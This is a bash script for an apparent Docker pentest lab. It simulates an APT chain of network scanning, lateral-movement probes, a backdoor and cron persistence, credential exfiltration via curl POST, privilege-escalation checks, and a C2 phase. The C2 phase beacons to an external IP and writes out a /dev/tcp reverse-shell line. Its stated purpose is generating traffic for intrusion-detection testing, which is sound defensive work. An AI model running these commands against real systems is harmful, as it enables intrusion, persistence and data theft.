#!/bin/bash
# Network Infiltration Testing Script
# Simulates advanced persistent threat (APT) and lateral movement attacks
# WARNING: Only use in authorized lab environments

KALI_CONTAINER="pentest-kali"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
OUTPUT_DIR="/root/pentest-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Target configuration
INITIAL_TARGET=${1:-"172.21.0.2"}  # Start from DMZ web server
INFILTRATION_TYPE=${2:-"all"}  # all, lateral_movement, persistence, data_exfiltration, privilege_escalation

echo "=========================================="
echo "Network Infiltration Testing"
echo "Initial Target: $INITIAL_TARGET"
echo "Infiltration Type: $INFILTRATION_TYPE"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="
echo ""
echo "⚠️  WARNING: This script performs network infiltration attacks."
echo "   Only use in authorized lab environments!"
echo ""
read -p "Continue? (y/n) " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    exit 1
fi

# Install required tools
echo "Installing required tools..."
docker exec $KALI_CONTAINER sh -c "apt-get update -qq && apt-get install -y -qq nmap metasploit-framework sshpass curl python3 python3-pip netcat-openbsd 2>&1 | grep -v '^WARNING' || true"

docker exec $KALI_CONTAINER mkdir -p $OUTPUT_DIR

# Network mapping
echo ""
echo "=== Phase 1: Network Mapping ==="
echo "Mapping network topology and identifying targets..."

# Discover DMZ network
echo "  - Scanning DMZ network (172.21.0.0/24)..."
docker exec $KALI_CONTAINER nmap -sn -oX "${OUTPUT_DIR}/infiltration_dmz_discovery_${TIMESTAMP}.xml" 172.21.0.0/24

# Discover Internal network (if accessible)
echo "  - Scanning Internal network (172.22.0.0/24)..."
docker exec $KALI_CONTAINER nmap -sn -oX "${OUTPUT_DIR}/infiltration_internal_discovery_${TIMESTAMP}.xml" 172.22.0.0/24

# Port scan initial target
echo "  - Port scanning initial target ($INITIAL_TARGET)..."
docker exec $KALI_CONTAINER nmap -sS -sV -O -p- -oX "${OUTPUT_DIR}/infiltration_target_scan_${TIMESTAMP}.xml" $INITIAL_TARGET

# Function for lateral movement
lateral_movement() {
    echo ""
    echo "=== Phase 2: Lateral Movement ==="
    echo "Attempting to move from DMZ to Internal network..."
    
    # Try to access internal services from compromised DMZ host
    INTERNAL_TARGETS=("172.22.0.3" "172.22.0.4" "172.22.0.5")
    
    for target in "${INTERNAL_TARGETS[@]}"; do
        echo "  - Attempting connection to $target..."
        
        # Try SSH
        docker exec $KALI_CONTAINER sh -c "
            timeout 5 nc -zv $target 22 2>&1 | tee -a ${OUTPUT_DIR}/infiltration_lateral_${TIMESTAMP}.log || true
        "
        
        # Try MySQL
        docker exec $KALI_CONTAINER sh -c "
            timeout 5 nc -zv $target 3306 2>&1 | tee -a ${OUTPUT_DIR}/infiltration_lateral_${TIMESTAMP}.log || true
        "
        
        # Try SMB
        docker exec $KALI_CONTAINER sh -c "
            timeout 5 nc -zv $target 445 2>&1 | tee -a ${OUTPUT_DIR}/infiltration_lateral_${TIMESTAMP}.log || true
        "
    done
    
    echo "  ✓ Lateral movement attempts completed"
}

# Function for persistence mechanisms
persistence() {
    echo ""
    echo "=== Phase 3: Persistence ==="
    echo "Establishing persistence mechanisms..."
    
    # Create backdoor script
    docker exec $KALI_CONTAINER sh -c "cat > /tmp/backdoor.sh <<'EOF'
#!/bin/bash
# Simple backdoor for testing
while true; do
    sleep 300
    # Simulate beacon to C2
    echo \"Beacon: \$(date)\" >> /tmp/.systemd.log 2>/dev/null || true
done
EOF
chmod +x /tmp/backdoor.sh
"
    
    # Simulate cron job persistence
    echo "  - Simulating cron job persistence..."
    docker exec $KALI_CONTAINER sh -c "
        echo '# Simulated persistence cron' >> ${OUTPUT_DIR}/infiltration_persistence_${TIMESTAMP}.log
        echo '*/5 * * * * /tmp/backdoor.sh' >> ${OUTPUT_DIR}/infiltration_persistence_${TIMESTAMP}.log
    "
    
    # Simulate SSH key persistence
    echo "  - Simulating SSH key persistence..."
    docker exec $KALI_CONTAINER sh -c "
        ssh-keygen -t rsa -f /tmp/infiltration_key_${TIMESTAMP} -N '' 2>&1 | tee -a ${OUTPUT_DIR}/infiltration_persistence_${TIMESTAMP}.log
        echo 'Public key for persistence:' >> ${OUTPUT_DIR}/infiltration_persistence_${TIMESTAMP}.log
        cat /tmp/infiltration_key_${TIMESTAMP}.pub >> ${OUTPUT_DIR}/infiltration_persistence_${TIMESTAMP}.log
    "
    
    echo "  ✓ Persistence mechanisms simulated"
}

# Function for data exfiltration
data_exfiltration() {
    echo ""
    echo "=== Phase 4: Data Exfiltration ==="
    echo "Simulating data exfiltration..."
    
    # Create dummy sensitive data
    docker exec $KALI_CONTAINER sh -c "cat > /tmp/sensitive_data.txt <<'EOF'
=== CONFIDENTIAL DATA ===
User Credentials:
admin:password123
root:admin123
user:password

Database Connection Strings:
mysql://172.22.0.3:3306/database
postgres://172.22.0.3:5432/db

API Keys:
API_KEY_12345
SECRET_TOKEN_67890

=== END CONFIDENTIAL DATA ===
EOF
"
    
    # Simulate exfiltration via HTTP POST
    echo "  - Simulating HTTP POST exfiltration..."
    docker exec $KALI_CONTAINER sh -c "
        curl -X POST -d @/tmp/sensitive_data.txt http://$INITIAL_TARGET/upload 2>&1 | tee -a ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log || true
    "
    
    # Simulate exfiltration via DNS tunneling
    echo "  - Simulating DNS tunneling exfiltration..."
    docker exec $KALI_CONTAINER sh -c "
        # Encode data in DNS queries
        echo 'Simulated DNS exfiltration:' >> ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log
        echo 'dig @8.8.8.8 sensitive-data.example.com' >> ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log
        dig @8.8.8.8 sensitive-data.example.com 2>&1 | tee -a ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log || true
    "
    
    # Simulate exfiltration via FTP
    echo "  - Simulating FTP exfiltration..."
    docker exec $KALI_CONTAINER sh -c "
        echo 'Simulated FTP exfiltration:' >> ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log
        echo 'ftp -n 172.22.0.4 <<EOF' >> ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log
        echo 'user ftpuser ftpuser' >> ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log
        echo 'put /tmp/sensitive_data.txt' >> ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log
        echo 'quit' >> ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log
        echo 'EOF' >> ${OUTPUT_DIR}/infiltration_exfiltration_${TIMESTAMP}.log
    "
    
    echo "  ✓ Data exfiltration simulated"
}

# Function for privilege escalation
privilege_escalation() {
    echo ""
    echo "=== Phase 5: Privilege Escalation ==="
    echo "Attempting privilege escalation..."
    
    # Check for SUID binaries
    echo "  - Checking for SUID binaries..."
    docker exec $KALI_CONTAINER sh -c "
        echo 'SUID Binary Check:' >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log
        find /usr/bin /usr/sbin -perm -4000 2>/dev/null | head -10 >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log || true
    "
    
    # Check for sudo access
    echo "  - Checking sudo access..."
    docker exec $KALI_CONTAINER sh -c "
        echo 'Sudo Access Check:' >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log
        sudo -l 2>&1 >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log || true
    "
    
    # Simulate kernel exploit attempt
    echo "  - Simulating kernel exploit check..."
    docker exec $KALI_CONTAINER sh -c "
        echo 'Kernel Version:' >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log
        uname -a >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log
        echo 'Potential exploits:' >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log
        echo 'CVE-2021-4034 (PwnKit)' >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log
        echo 'CVE-2021-3156 (Sudo Baron Samedit)' >> ${OUTPUT_DIR}/infiltration_privilege_${TIMESTAMP}.log
    "
    
    echo "  ✓ Privilege escalation checks completed"
}

# Function for command and control (C2) simulation
command_control() {
    echo ""
    echo "=== Phase 6: Command and Control ==="
    echo "Simulating C2 communication..."
    
    # Simulate beacon to external C2 server
    echo "  - Simulating C2 beacon..."
    docker exec $KALI_CONTAINER sh -c "
        echo 'C2 Beacon Simulation:' >> ${OUTPUT_DIR}/infiltration_c2_${TIMESTAMP}.log
        echo 'Beacon timestamp: \$(date)' >> ${OUTPUT_DIR}/infiltration_c2_${TIMESTAMP}.log
        echo 'Hostname: \$(hostname)' >> ${OUTPUT_DIR}/infiltration_c2_${TIMESTAMP}.log
        echo 'IP Address: \$(hostname -I)' >> ${OUTPUT_DIR}/infiltration_c2_${TIMESTAMP}.log
        # Simulate HTTP beacon
        curl -s -A 'Mozilla/5.0' 'http://144.178.248.26/beacon?id=test123' 2>&1 | tee -a ${OUTPUT_DIR}/infiltration_c2_${TIMESTAMP}.log || true
    "
    
    # Simulate reverse shell attempt
    echo "  - Simulating reverse shell..."
    docker exec $KALI_CONTAINER sh -c "
        echo 'Reverse Shell Simulation:' >> ${OUTPUT_DIR}/infiltration_c2_${TIMESTAMP}.log
        echo 'bash -i >& /dev/tcp/144.178.248.26/4444 0>&1' >> ${OUTPUT_DIR}/infiltration_c2_${TIMESTAMP}.log
        # Note: Actual connection would be blocked, but pattern is logged
    "
    
    echo "  ✓ C2 simulation completed"
}

# Run infiltration phases based on type
case $INFILTRATION_TYPE in
    lateral_movement)
        lateral_movement
        ;;
    persistence)
        persistence
        ;;
    data_exfiltration)
        data_exfiltration
        ;;
    privilege_escalation)
        privilege_escalation
        ;;
    command_control)
        command_control
        ;;
    all)
        echo "Running complete infiltration scenario..."
        lateral_movement
        persistence
        data_exfiltration
        privilege_escalation
        command_control
        ;;
    *)
        echo "Unknown infiltration type: $INFILTRATION_TYPE"
        echo "Available types: lateral_movement, persistence, data_exfiltration, privilege_escalation, command_control, all"
        exit 1
        ;;
esac

echo ""
echo "=========================================="
echo "Network Infiltration Testing Complete"
echo "=========================================="
echo ""
echo "Infiltration logs saved in Kali container:"
echo "  ${OUTPUT_DIR}/infiltration_*_${TIMESTAMP}.log"
echo ""
echo "Next steps:"
echo "1. Analyze captured traffic: ./scripts/analyze-pcap.sh <pcap_file>"
echo "2. Review infiltration patterns in PCAP analysis"
echo "3. Generate IDPS rules for APT detection"
echo "4. Test IDPS detection capabilities"
echo "5. Review network segmentation effectiveness"
